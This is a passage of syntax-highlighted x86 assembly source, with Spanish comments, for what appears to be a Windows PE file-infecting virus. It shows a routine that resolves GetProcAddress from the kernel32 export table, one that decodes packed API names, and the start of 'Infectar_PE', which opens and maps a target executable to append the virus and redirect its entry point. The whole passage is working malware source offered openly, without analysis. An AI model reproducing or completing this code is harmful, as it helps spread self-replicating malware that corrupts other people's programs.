  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc5">@Busca</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GPA</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">Largo_GPA</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">CMPSB</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Encontrado_GPA</span><span class="sc0">

  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">

  </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@Busca</span><span class="sc0">

  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Hardcode</span><span class="sc0">

  </span><span class="sc5">@Encontrado_GPA</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EXPORTS</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

    </span><span class="sc6">MOVZX</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">IMUL</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetProcAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

    </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">@Hardcode</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">GPA_9X</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetProcAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">EXPORTS</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">GPA</span><span class="sc0">                   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">Largo_GPA</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">GPA</span><span class="sc0">
  </span><span class="sc5">GetProcAddress</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

  </span><span class="sc5">Obtener_GPA</span><span class="sc0">           </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

  </span><span class="sc1">; Proceso para obtener y desempaquetar las APIs</span><span class="sc0">
  </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc1">; EBX -&gt; Modulo.</span><span class="sc0">
  </span><span class="sc1">; EDI -&gt; Cadenas de las APIs (empaquetadas).</span><span class="sc0">
  </span><span class="sc1">; ESI -&gt; DWORDs para guardar las rvas.</span><span class="sc0">

  </span><span class="sc5">Obtener_APIs</span><span class="sc0">          </span><span class="sc9">PROC</span><span class="sc0">

  </span><span class="sc1">; 01h -&gt; Create</span><span class="sc0">
  </span><span class="sc1">; 02h -&gt; File</span><span class="sc0">
  </span><span class="sc1">; 03h -&gt; Map</span><span class="sc0">
  </span><span class="sc1">; 04h -&gt; View</span><span class="sc0">
  </span><span class="sc1">; 05h -&gt; Find</span><span class="sc0">
  </span><span class="sc1">; 06h -&gt; Close</span><span class="sc0">
  </span><span class="sc1">; 07h -&gt; Set</span><span class="sc0">
  </span><span class="sc1">; 08h -&gt; Get</span><span class="sc0">
  </span><span class="sc1">; 09h -&gt; Load</span><span class="sc0">
  </span><span class="sc1">; 0Ah -&gt; CurrentDirectory</span><span class="sc0">
  </span><span class="sc1">; 0Bh -&gt; Virtual</span><span class="sc0">

  </span><span class="sc6">PUSHAD</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PaGuardar</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

  </span><span class="sc5">@OA1</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Trabajo</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@OA2</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@OA4</span><span class="sc0">

  </span><span class="sc6">LODSB</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">
  </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc5">@OA3</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Packer</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@OA5</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@OA5</span><span class="sc0">

  </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@OA5</span><span class="sc0">

  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc5">@OA6</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOVSB</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@OA6</span><span class="sc0">

  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@OA2</span><span class="sc0">

  </span><span class="sc5">@OA3</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">STOSB</span><span class="sc0">
  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@OA2</span><span class="sc0">

  </span><span class="sc5">@OA4</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
  </span><span class="sc6">STOSB</span><span class="sc0">
     
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Trabajo</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PaGuardar</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PaGuardar</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@OA1</span><span class="sc0">

  </span><span class="sc5">@OA7</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">POPAD</span><span class="sc0">
  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">API_Trabajo</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">PaGuardar</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">API_Packer</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">":)"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Create"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"File"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Map"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"View"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Find"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Close"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Set"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Get"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Load"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"CurrentDirectory"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Virtual"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

  </span><span class="sc1">; 01h -&gt; Create</span><span class="sc0">
  </span><span class="sc1">; 02h -&gt; File</span><span class="sc0">
  </span><span class="sc1">; 03h -&gt; Map</span><span class="sc0">
  </span><span class="sc1">; 04h -&gt; View</span><span class="sc0">
  </span><span class="sc1">; 05h -&gt; Find</span><span class="sc0">
  </span><span class="sc1">; 06h -&gt; Close</span><span class="sc0">
  </span><span class="sc1">; 07h -&gt; Set</span><span class="sc0">
  </span><span class="sc1">; 08h -&gt; Get</span><span class="sc0">
  </span><span class="sc1">; 09h -&gt; Load</span><span class="sc0">
  </span><span class="sc1">; 0Ah -&gt; CurrentDirectory</span><span class="sc0">
  </span><span class="sc1">; 0Bh -&gt; Virtual</span><span class="sc0">


  </span><span class="sc5">Obtener_APIs</span><span class="sc0">          </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

  </span><span class="sc1">; Proceso para infectar un archivo PE.</span><span class="sc0">
  </span><span class="sc1">; EBX -&gt; Nombre del archivo.</span><span class="sc0">

  </span><span class="sc5">Infectar_PE</span><span class="sc0">           </span><span class="sc9">PROC</span><span class="sc0">

  </span><span class="sc6">PUSHAD</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Retorno</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EP_Viejo</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Bad_Dwords</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@Rev_BadDW</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Fin_IPE</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
  </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">@Rev_BadDW</span><span class="sc0">

  </span><span class="sc5">@Rev_BadW</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Fin_IPE</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
  </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">@Rev_BadW</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@Fin_IPE</span><span class="sc0">
  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@Fin_IPE</span><span class="sc0">
  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Total</span><span class="sc4">+</span><span class="sc2">1000h</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FHandle</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@Cierra_FHandle</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o2</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BaseMap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@Cierra_MHandle</span><span class="sc0">

